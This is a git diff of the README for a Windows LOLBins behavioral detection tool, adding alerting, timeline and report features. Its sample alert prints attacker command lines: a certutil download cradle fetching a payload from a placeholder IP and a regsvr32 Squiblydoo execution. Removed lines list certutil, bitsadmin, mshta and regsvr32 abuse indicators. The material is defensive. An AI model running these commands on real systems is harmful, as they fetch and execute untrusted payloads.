@@ -10,26 +10,21 @@ A modular Windows Behavioral Living-off-the-Land (LOLBins) Detection System buil
   - Captures: `PID`, `PPID`, `Image`, `CommandLine`, `User`, `ParentImage`, `CreationTime`, and `IntegrityLevel` (via Win32 Security Token API or heuristic account context).
   - Handles permissions (`AccessDenied`, missing debug privileges) on a per-process level without crashing.
   - Automatically persists all process events directly into SQLite.
-  - Continuous execution until interrupted or signaled to stop.
 - **Sequential Attack Chain Correlation**:
   - Correlates multi-stage behavioral patterns over a **2–5 minute sliding window**.
   - **Download then Execute Chain**: Correlates ingress transfer via `certutil`, `bitsadmin`, or `powershell` with immediate payload or LOLBin execution.
   - **Encoded PowerShell after LOLBin**: Detects staging via native utilities followed by obfuscated/encoded PowerShell payloads.
   - **Cascading Shell Chain**: Identifies process tree cascades (`cmd.exe` -> `powershell.exe` -> downstream LOLBin).
-  - Partitioning across **user accounts** or **process tree lineage**.
-- **Single-Event Behavioral Rules**:
-  - Office applications spawning native LOLBins (`winword.exe`, `excel.exe`, `powerpnt.exe`, `outlook.exe`).
-  - Suspicious `certutil` usage (`-urlcache`, `-decode`, HTTP/HTTPS URLs).
-  - Suspicious `bitsadmin` remote transfers (`/transfer`, `/addfile`, external URLs).
-  - `mshta` inline script execution (`javascript:`, `vbscript:`, remote `.hta`).
-  - `regsvr32` proxy execution patterns (Squiblydoo, `scrobj.dll`, `/i:http:`).
+- **Alerting & Timeline Reconstruction System**:
+  - **Contextual Timeline Reconstruction**: Reconstructs events occurring **± 5–10 minutes** around an alert, classifying relationships (`[TRIGGER]`, `[PARENT]`, `[CHILD]`, `[SIBLING]`, `[SAME_USER]`, `[ANCESTOR]`) and calculating chronological delta offsets.
+  - **Process Lineage Tree**: Renders ASCII process hierarchy trees for immediate visual triage.
+  - **Multi-Channel Exporters**:
+    - **Console**: Structured ANSI-colored alert banner with process context and concise timeline.
+    - **JSON**: Append-only `alerts.jsonl` plus individual incident JSON files (`data/alerts/incidents/incident_<rule_id>_<id>.json`) for SIEM/SOAR ingestion.
+    - **Markdown SOC Report**: Standardized, professional incident reports (`reports/incident_<rule_id>_<id>.md`) including MITRE ATT&CK mapping, process tables, evidence lists, process trees, timeline tables, and SOC containment/remediation playbooks.
 - **Dual Rule Formats**:
   - Declarative **YAML** definitions (`rules/definitions/*.yaml`).
   - Extensible **Python** rule classes (`rules/python_rules/*.py`).
-- **Structured Alerts & Storage**:
-  - Emits rich alerts with full context: trigger process, matched indicators, correlated multi-event timeline, sequence duration, and MITRE ATT&CK technique IDs.
-  - SQLite backend with WAL mode and foreign key constraints.
-  - Formatted color console alert banners and JSONL alert file output.
 
 ## Project Structure
 
@@ -57,13 +52,15 @@ lolbins-detector/
 │       ├── chain_rules.py             # Concrete Python implementations of attack chains
 │       ├── example_sequential_rule.py # Example Python SequentialRule
 │       └── example_single_rule.py     # Example Python BaseRule with lineage inspection
+├── output/
+│   ├── __init__.py             # Output component exports
+│   ├── notifier.py             # AlertDispatcher coordinating all output channels
+│   ├── timeline.py             # TimelineReconstructor & ASCII tree generator (± 5-10 min)
+│   └── markdown_report.py      # Professional Markdown SOC incident report generator
 ├── storage/
 │   ├── __init__.py
-│   ├── database.py             # SQLite database manager
+│   ├── database.py             # SQLite database manager with temporal queries
 │   └── schema.sql              # SQLite schema for process_events and alerts
-├── output/
-│   ├── __init__.py
-│   └── notifier.py             # Console alert banners and JSONL alert logging
 ├── utils/
 │   ├── __init__.py
 │   ├── config.py               # Typed configuration loader
@@ -73,6 +70,44 @@ lolbins-detector/
 ├── requirements.txt            # Python dependencies
 └── main.py                     # Application entry point
 ```
+
+## Generated Outputs
+
+### 1. Console Output
+```text
+══════════════════════════════════════════════════════════════════════════════
+ [ALERT: CRITICAL] SEQ-CHAIN-001 - Attack Chain: LOLBin Download Cradle Followed by Payload Execution
+══════════════════════════════════════════════════════════════════════════════
+  Alert ID        : a1b2c3d4-e5f6-7890-abcd-ef1234567890
+  Timestamp (UTC) : 2026-11-01T04:47:28Z
+  MITRE ATT&CK    : T1105, T1204.002, T1218, T1059
+  Trigger Process : C:\Windows\System32\regsvr32.exe (PID: 6900, PPID: 3912)
+  Parent Process  : C:\Windows\System32\cmd.exe
+  Command Line    : regsvr32.exe /s /n /u /i:C:\ProgramData\update.sct scrobj.dll
+  Security User   : WORKSTATION\StandardUser (Medium integrity)
+  Indicators      : stage_1:Ingress Download Cradle, stage_2:Dropped Payload or Proxy Execution
+  Sequence Chain  : Correlated in 0.01s (Key: user:WORKSTATION\STANDARDUSER)
+  Process Lineage :
+    cmd.exe (PID: 3912)
+    └── regsvr32.exe (PID: 6900) [TRIGGER]
+  Timeline (± 5-10m Window: 2 correlated events):
+        -00m 00s   | [SAME_USER] | PID 6832  | certutil.exe    | certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin...
+    >>> TRIGGER    | [TRIGGER]   | PID 6900  | regsvr32.exe    | regsvr32.exe /s /n /u /i:C:\ProgramData\update.sct scrobj.dll
+──────────────────────────────────────────────────────────────────────────────
+```
+
+### 2. JSON Artifacts
+- **Aggregate log**: `data/alerts.jsonl`
+- **Individual incident payloads**: `data/alerts/incidents/incident_<rule_id>_<id>.json` containing full metadata, matched indicator tokens, and timeline reconstruction events.
+
+### 3. Markdown Incident Reports
+Saved to `reports/incident_<rule_id>_<id>.md` formatted for SOC triage, including:
+- Incident Overview and Triage Summary
+- Target Binary and Execution Context table
+- Matched Behavioral Indicators
+- Process Lineage & Ancestry Tree diagram
+- Correlated Timeline Table with relative deltas
+- SOC Analyst Incident Response and Containment Playbook
 
 ## Usage
 
